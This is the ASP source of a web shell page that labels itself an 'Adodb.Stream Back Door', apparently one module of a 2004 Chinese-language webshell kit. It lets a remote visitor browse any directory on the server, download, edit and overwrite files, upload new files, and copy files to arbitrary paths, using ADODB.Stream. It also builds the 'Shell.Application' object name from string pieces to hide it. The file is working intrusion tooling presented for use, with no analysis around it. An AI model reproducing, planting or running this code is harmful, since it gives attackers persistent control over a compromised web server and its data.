<%
	option explicit
%>
<!--#include file="config.asp"-->

<!-- PageStream Below -->
<%
	pageStream()
	
	sub pageStream()
		isIn(2)
		dim theAct,thePath,toPath,fileName
		theAct=request("theAct")
		toPath=request("toPath")
		thePath=request("thePath")
		fileName=request("fileName")
		
		if thePath="" then
			thePath=server.mapPath(".")
		end if
	
		select case theAct
			case "save"
				streamEditFile(thePath)
				response.end
			case "down"
				downTheFile(thePath)
				response.end
			case "saveAsTwo"
				saveAsTwo thePath,toPath
				response.end
		end select

		showTitle("流操作页面")
		pageOther()
		showMenu()
		
		select case theAct
			case "edit"
				streamEditFile(thePath)
				response.end
			case "upload"
				streamUpload thePath,fileName
				echo "<script language=""javascript"">location.href='?pageName=stream&thePath="&encodeForUrl(thePath,true)&"';</script>"
				response.end
		end select
%>
<table width="760" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr> 
    <td height="22" colspan="2" class="td">&nbsp;<%=request.serverVariables("server_name")%> 
      - Adodb.Stream Back Door</td>
  </tr>
  <tr> 
    <td colspan="2" class="trHead">&nbsp;</td>
  </tr>
  <form method="post" onSubmit="this.Submit3.disabled=true;" action="?pageName=stream">
    <tr> 
      <td colspan="2" class="td">&nbsp;PATH: 
        <input name="thePath" type="text" id="thePath" value="<%=thePath%>" size="60"> 
        <input type="button" name="Submit3" value="查 看" onclick="location.href='?pageName=stream&thePath='+this.form.thePath.value;this.disabled=true;">
      </td>
    </tr>
  </form>
  <form method="post" enctype="multipart/form-data" action="?pageName=stream&theAct=upload&thePath=<%=encodeForUrl(thePath,false)%>" onsubmit="return upload_canSubmit(this);">
    <tr> 
      <td colspan="2" class="td">&nbsp;
        <input name="file" type="file" size="25">
        保存为 
        <input name="fileName" type="text" value="<%=thePath%>" size="35"> 
		<input name="Submit" type="submit" id="Submit" value="上 传" onClick="this.form.action+='&theFile='+this.form.file.value+'&overWrite='+this.form.writeMode.checked;">
        <input type="checkbox" name="writeMode" value="True">覆盖模式
      </td>
    </tr>
  </form>
  <tr> 
    <td colspan="2" class="trHead">&nbsp;</td>
  </tr>
  <tr> 
    <td width="30%" class="td" valign="top">
      <%call streamGetFolderList(thePath,true)%>
    </td>
    <td width="555" valign="top"> 
      <%call streamGetFolderList(thePath,false)%>
      <br> <div id="loaded" style="display:none;"> 
        <iframe id="fileEditor" frameborder="0" scrolling="no" valign="top" width="100%" height="475"></iframe>
      </div></td>
  </tr>
  <tr> 
    <td colspan="2" class="trHead">&nbsp;</td>
  </tr>
  <tr align="right"> 
    <td height="22" colspan="2" class="td">Powered By <a href="javascript:;" title="QQ:26696782">Marcos</a> 2004.11&nbsp;</td>
  </tr>
</table>
<a name="foot"></a>
<%
		showExecuteTime()
	end sub
	
	sub streamEditFile(thePath)
		dim fileName,fileContent,userCharset
		fileName=thePath
		userCharset=request("userCharset")
		
		if request("theAct")="save" then
			fileContent=request("fileContent")
			streamWriteToFile thePath,fileContent
			response.end
		end if
		
		fileContent=streamReadFromFile(fileName,request("userCharset"))
%>
<table border="0" align="center" cellpadding="0" cellspacing="0">
  <form method="post" action="?pageName=stream&theAct=save" onsubmit="if(confirm('您确认要保存当前文件吗?')){this.Submit.disabled=true;this.Submit2.disabled=true;this.Submit3.disabled=true;}else{return false;}">
    <tr>
      <td><input name="thePath" type="text" id="thePath" value="<%=thePath%>" size="50">
        <input type="button" name="Submit6" value="查 看" onclick="location.href='?pageName=stream&theAct=edit&thePath='+this.form.thePath.value;this.disabled=true;"></td>
    </tr>
    <tr> 
      <td><textarea name="fileContent" cols="70" rows="25" id="fileContent"><%=server.htmlEncode(fileContent)%></textarea></td>
    </tr>
    <tr> 
      <td height="50" align="right"><font class="warningColor">非GB2312编码文件可能无法正确保存!</font> 
        <input name="userCharset" type="text" value="<%=userCharset%>" size="10"> 
        <input type="button" value="重新编码" name="Submit3" onclick="location.href='?<%=replace("pageName=stream&thePath="&thePath&"&theAct=edit","\","\\")%>&userCharset='+this.form.userCharset.value;this.disabled=true;"> 
        <input type="button" name="Submit" value="保 存" onClick="if(confirm('确认保存修改?')){this.form.submit();}"> 
        <input type="button" name="Submit2" value="另存为" onclick="stream_saveAs(this.form,'<%=encodeForUrl(thePath,true)%>');"> 
        &nbsp; </td>
    </tr>
  </form>
</table>
<a name="foot"></a>
<%
		showExecuteTime()
	end sub
	
	sub streamGetFolderList(thePath,showFolder)
		dim sa,ext,flag,list,folders,theHref
		set sa=server.createObject(shellStr&"."&applicationStr)

		if len(thePath)=2 then
			thePath=thePath&"\"
		end if

		set folders=sa.namespace(thePath)

		if showFolder=true and getParentFolder(thePath)<>"" then
			echo "&nbsp;<a href=""?pageName=stream&thePath="&encodeForUrl(getParentFolder(thePath),false)&""">..</a><br>"
		end if

		on error resume next
		for each list in folders.items
			if showFolder=true and list.isfolder Then
				echo "&nbsp;<a href=""?pageName=stream&thePath="&encodeForUrl(list.path,false)&""">["
				echo replace(replace(lcase(list.path),lcase(thePath),""),"\","")
				echo "]</a><br>"
			 else
				if showFolder=false and (not list.isfolder) Then
					ext=split(list.path,".")(uBound(split(list.path,".")))
					flag=instr(lcase(editableFileExt),lcase("$"&ext&"$"))
					if instr(lcase(list.path),lcase(server.mapPath("/"))) then
						theHref=encodeForUrl(mid(replace(lcase(list.path),lcase(server.mapPath("/")),""),2),false)
						echo "&nbsp;<a href=""/"&theHref&""" target=_blank>"&replace(replace(lcase(list.path),lcase(thePath),""),"\","")&"</a>"
					 else
						echo "&nbsp;"&replace(replace(lcase(list.path),lcase(thePath),""),"\","")
					end if
					echo "&nbsp;&nbsp;&nbsp;<a href=javascript:; onclick=""stream_downIt('" & encodeForUrl(list.path, False) & "');""><font class=warningColor>Down</font></a>-"
					if flag>0 then
						echo "<a href=#foot onclick=""stream_editIt('" & encodeForUrl(list.path, False) & "');""><font class=warningColor>Edit</font></a>-"
					end if
					echo "<a href=javascript:; onclick=""stream_saveAsTwo('"&encodeForUrl(list.path,true)&"','"&encodeForUrl(list.path, False)&"');""><font class=warningColor>SaveAs</font></a>-"
					echo getTheSize(list.size)
					echo "<br>"
				end if
			end if
		next
		if err then
			onErr err.description
		end if
	end sub
	
	sub downTheFile(thePath)
		dim stream,fileName,fileContentType
		fileName=split(thePath,"\")(uBound(split(thePath,"\")))
		set stream=server.createObject("adodb.stream")
		stream.open
		stream.type=1
		stream.loadFromFile(thePath)
		fileContentType=getContentType(fileName)
		response.addHeader "Content-Disposition", "attachment; filename=" & fileName
		response.addHeader "Content-Length",stream.Size
		response.charset="UTF-8"
		response.contentType=fileContentType
		response.binaryWrite stream.read 
		response.flush
		stream.close
		set stream=nothing
	end sub
	
	function getContentType(fileName)
		select case split(fileName,".")(uBound(split(fileName,".")))
			case "asf"
				getContentType="video/x-ms-asf"
			case "avi"
				getContentType="video/avi"
			case "doc"
				getContentType="application/msword"
			case "zip"
				getContentType="application/zip"
			case "xls"
				getContentType="application/vnd.ms-excel"
			case "gif"
				getContentType="image/gif"
			case "jpg", "jpeg"
				getContentType="image/jpeg"
			case "wav"
				getContentType="audio/wav"
			case "mp3"
				getContentType="audio/mpeg3"
			case "mpg", "mpeg"
				getContentType="video/mpeg"
			case "rtf"
				getContentType="application/rtf"
			case "htm", "html"
				getContentType="text/html"
			case "txt","js"
				getContentType="text/plain"
			case else
				getContentType="application/octet-stream"
		end select
	end function
	
	sub saveAsTwo(thePath,toPath)
		on error resume next
		dim stream
		if lTrim(thePath)=lTrim(toPath) then
			echo "<script>alert('源路径与目标路径相同,操作停止!');</script>"
			response.end
		end if
		set stream=server.createObject("adodb.stream")
		stream.type=1
		stream.open
		stream.loadFromFile thePath
		chkErr err,err.description
		stream.saveToFile toPath,2
		echo "<script language=""javascript"">alert('另存为操作成功!');</script>"
		set stream=nothing
	end sub
	
	function streamReadFromFile(thePath,userCharset)
		dim stream
		set stream=server.createObject("adodb.stream")
		with stream
			.type=2
			.mode=3
			.open
			on error resume next
			.loadFromFile thePath
			chkErr err,err.description
			if userCharset<>"" then
				.charset=userCharset
			 else
				.charset="gb2312"
			end if
			chkErr err,"编码类型错误!"
			.Position=2
			streamReadFromFile=.readText()
			.close
		end with
		set stream=nothing
	end function
	
	sub streamWriteToFile(thePath,fileContent)
		dim stream
		set stream=server.createObject("adodb.stream")
		with stream
			.type=2
			.mode=3
			.open
			.charset="gb2312"
			.writeText fileContent
			.saveToFile thePath,2
			.close
		end with
		set stream=nothing
		echo "文件保存成功! [<a href="""&request.serverVariables("http_referer")&""">返回</a>]"
	end sub
%>